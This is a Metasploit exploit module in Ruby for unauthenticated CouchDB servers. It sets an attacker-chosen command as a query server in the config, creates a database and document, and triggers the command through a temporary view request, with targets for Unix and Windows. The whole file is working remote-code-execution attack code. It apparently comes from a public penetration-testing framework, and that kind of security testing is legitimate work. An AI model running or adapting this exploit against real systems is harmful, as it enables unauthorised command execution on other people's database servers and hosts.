##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CouchDB Unauthentication Remote Command Execution',
      'Description'    => %q{
        This module exploits a misconfiguration in CouchDB. If CouchDB api
        without authentication, attackers can execute os commands with
        the query_servers option in local.ini.
      },
      'Author'         => [
        'Nixawk', # original metasploit module
       ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'blog.rot13.org/2010/11/triggers-in-couchdb-from-queue-to-external-command-execution.html' ],
          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-91389' ]
        ],
      'Platform'       => %w{ unix win },
      'Targets'        =>
        [
          [ 'Windows', { 'Arch' => ARCH_X86, 'Platform' => 'win', 'CmdStagerFlavor' => 'vbs' }],
          [ 'Unix',    { 'Arch' => ARCH_CMD, 'Platform' => 'unix' }]
        ],
      'DisclosureDate' => 'Nov 23 2010',
      'DefaultTarget'  => 1
    ))

    register_options(
      [
        Opt::RPORT(5984),
        OptString.new('TARGETURI', [ true, 'The path to a default couchDB api', '/'])
      ], self.class)
  end

  def valid_json?(json)
    begin
      JSON.parse(json)
      return true
    rescue JSON::ParserError
      return false
    end
  end

  def unauth?
    uri = normalize_uri(datastore['TARGETURI'])
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'GET'
    )

    resp && resp.code == 200 && resp.body.include?("couchdb") && valid_json?(resp.body)
  end

  def execute_command(cmd, opts = {})
    @dbname = rand_text_alpha_lower(16)
    @key = rand_text_alpha_lower(16)
    @value = rand_text_alpha_lower(16)

    # save command
    # command = "ls > /tmp/test1"
    uri = normalize_uri(datastore['TARGETURI'], "_config/query_servers/#{@key}")
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'PUT',
      'data'    => "\"#{cmd}\""
    )
    return unless resp && resp.code == 200 && resp.body.include?("\"\"\n")

    # create datebase
    uri = normalize_uri(datastore['TARGETURI'], @dbname)
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'PUT'
    )

    return unless resp && resp.code == 201 && resp.body.include?("true") && valid_json?(resp.body)

    # create database key
    data = "{\"#{@key}\": \"#{@value}\"}"
    uri = normalize_uri(datastore['TARGETURI'], @dbname, @key)
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'PUT',
      'data'    => data
    )

    return unless resp && resp.code == 201 && resp.body.include?("true") && valid_json?(resp.body)

    # execute code
    uri = normalize_uri(datastore['TARGETURI'], @dbname, "_temp_view?limit=11")
    data = "{\"language\":\"#{@key}\",\"map\":\"\"}"
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'POST',
      'ctype'   => 'application/json',
      'data'    => data
    )

    resp && resp.code == 500 && resp.body.include?("error") && valid_json?(resp.body)

    # delete database
    uri = normalize_uri(datastore['TARGETURI'], @dbname)
    resp = send_request_cgi(
      'uri'     =>  uri,
      'method'  => 'DELETE'
    )

    return unless resp && resp.code == 200 && resp.body.include?("true") && valid_json?(resp.body)
  end

  def check
    if unauth?
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    return unless unauth?

    case target['Platform']
    when 'win'
      print_status("#{peer} - Sending command stager...")
      execute_cmdstager({ :linemax => 2000 })
    when 'unix'
      print_status("#{peer} - Sending payload...")
      execute_command(payload.encoded)
    end
  end
end
